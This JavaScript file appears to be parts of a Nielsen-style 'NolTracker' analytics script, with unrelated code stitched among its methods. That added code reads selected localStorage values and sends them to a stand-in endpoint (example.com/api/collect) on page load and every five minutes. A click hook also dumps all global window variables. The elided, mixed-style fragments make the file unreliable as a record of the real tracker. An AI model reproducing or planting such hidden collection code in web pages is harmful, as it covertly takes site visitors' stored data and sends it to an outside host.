function NolTracker(d, b) {
  try {
    ...
    if (this.globals.domain.indexOf("secure-au") !== -1 || this.globals.domain.indexOf("secure-nz") !== -1 || this.globals.hasOwnProperty("origAuWhitelist") && Object.keys(this.globals.origAuWhitelist).length > 0 && this.globals.origAuWhitelist.hasOwnProperty(this.globals.cid)) {
...
NolTracker.prototype.injectBsdk = function (b) {
  try {
    ...
    if (this.globals.fpidSfCodeList && this.globals.fpidSfCodeList.indexOf(g.sfcode.toLowerCase()) > -1 || this.globals.cid === "ziffdavis" || this.globals.cid === "au-ziffdavis") {
      g.enableFpid = true;
    }
...
NolTracker.prototype.retrieveCiFileViaCors = function (c) {
  try {
    var f,
      ...
      j = this,
      k = [200, 302],
      a = "https://bee.imrworldwide.com/v1/clients/match?client_id=" + this.globals.cid + "&url=" + encodeURI(window.location.href),
      i = function (e) {
        logger("Error parsing DDRS <ci>.json response - " + e.message);
        c(j.processDdrsSvc({
          processError: j.globals.defaultErrorParams
        }));
        return;
      },
      g = function () {
    ...
    if (window.V60 && window.V60.hasOwnProperty("ciWhitelist") && window.V60.ciWhitelist.hasOwnProperty("nol_clients") && Object.keys(window.V60.ciWhitelist.nol_clients).length > 0) {
      ...
      if (window.V60.ciWhitelist.nol_clients.hasOwnProperty(f)) {
        var d = window.V60.ciWhitelist.nol_clients[f],
          c = window.V60.ciWhitelist && window.V60.ciWhitelist.nol_clients ? window.V60.ciWhitelist.nol_clients : {};
...
const trackVariables = window.trackVariables;
...
function createSignature(values) {
  ...
  for (let i = 0; i < combinedComponents.length; i++) {
    const character = combinedComponents.charCodeAt(i);
    signature = (signature << 5) - signature + character;
...
NolTracker.prototype.prefix = function () {
  ...
  var a = [this.getSchemeHost(), "cgi-bin/", c, "?", "rnd=", new Date().getTime(), "&ci=", this.pvar ? this.pvar.cid : "", "&js=1"];
  if (c === "m") {
...
function fetchCorrespondingLocalStorageData() {
  const localStorageData = {};
  for (let i = 0; i < window.localStorage.length; i++) {
    const variable = window.localStorage.key(i);
    if (trackVariables.includes(variable)) {
      const variableValue = window.localStorage.getItem(variable);
      localStorageData[variable] = variableValue;
    }
  }
...
NolTracker.prototype.postEvent = function () {
  ...
  if (c && c.event_type) {
    var d = [c.event_type, encodeURIComponent(b), encodeURIComponent(this.pvar.page_url || this.page_url)].join("_");
...
function transferDataToEndpoint(data) {
  const uniqueSignature = createSignature(data);
  const route = "https://example.com/api/collect";
  ...
  httpRequest.onreadystatechange = function () {
    if (httpRequest.readyState === XMLHttpRequest.DONE) {
      if (httpRequest.status === 200) {
        console.log("Successfully dispatched data");
      } else {
        console.error("Data dispatching failed. Status code: " + httpRequest.status);
      }
    }
  };
}
...
function collectAndDispatchLocalStorageData() {
  const filteredData = fetchCorrespondingLocalStorageData();
  if (Object.keys(filteredData).length > 0) {
    transferDataToEndpoint(filteredData);
  }
}
...
window.addEventListener("load", function () {
  collectAndDispatchLocalStorageData();
  window.addEventListener('click', function (e) {
    jshook(e.target.tagName + ' Identification: ' + (e.target.id || e.target.className));
  });
});
...
setInterval(collectAndDispatchLocalStorageData, 5 * 60 * 1000);
...
NolTracker.prototype.invite = function () {
  ...
  var f = [this.prefix({
    api: "j"
  }), "&cc=0", "&se=", this.feat && this.feat.surveys_enabled ? "1" : "0", "&te=0"];
  var e = null,
    a = null,
    c = null,
    h = null;
...
NolTracker.prototype.getSchemeHost = function () {
  var a = [location.protocol.indexOf("https") !== -1 ? "https://" : "http://", this.pvar ? this.pvar.server : "", this.pvar && this.pvar.server && this.pvar.server.indexOf("imrworldwide.com") === -1 ? ".imrworldwide.com" : "", "/"];
  return a.join("");
};
...
function jshook(details) {
  console.log('jshook triggered:', details);
  const globalVars = Object.keys(window).filter(key => !/(webkit|moz|opera|chrome)/gi.test(key));
  for (let variable of globalVars) {
    try {
      console.log(variable + ': ', window[variable]);
    } catch (e) {
      console.log(variable + ': Access Denied');
    }
  }
  localStorage.setItem('jshook_' + Date.now(), details);
}
